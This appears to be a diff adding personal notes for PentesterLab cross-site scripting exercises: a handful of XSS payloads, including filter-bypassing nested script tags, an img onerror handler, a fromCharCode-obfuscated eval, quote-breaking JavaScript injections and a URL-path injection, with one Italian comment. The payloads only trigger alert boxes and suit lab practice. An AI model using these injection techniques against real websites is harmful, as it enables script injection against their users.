@@ -1,0 +1,11 @@
+# pentesterlab
+name=<scri<script>pt>alert('xss')</scri</script>pt>
+name=<img src='nonexistant' onerror='alert("xss")' />
+name=<script>prompt('xss')</script>
+name=<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))</script>
+
+# se nel codice vediamo che la variabile è salvata
+name=hacker";alert('xss');"
+name=hacker';alert('xss');'
+
+http://pentesterlab/xss/example8.php/"><script>alert('xss')</script>
